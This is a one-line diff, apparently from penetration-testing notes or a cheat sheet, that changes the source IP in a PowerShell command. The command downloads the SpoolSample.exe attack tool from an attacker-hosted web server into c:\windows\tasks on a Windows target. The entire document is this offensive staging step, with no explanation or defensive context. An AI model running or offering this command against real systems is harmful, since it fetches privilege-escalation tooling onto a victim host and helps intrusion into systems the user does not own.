@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/SpoolSample.exe','c:\windows\tasks\SpoolSample.exe')
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.2.2.231/tools/SpoolSample.exe','c:\windows\tasks\SpoolSample.exe')
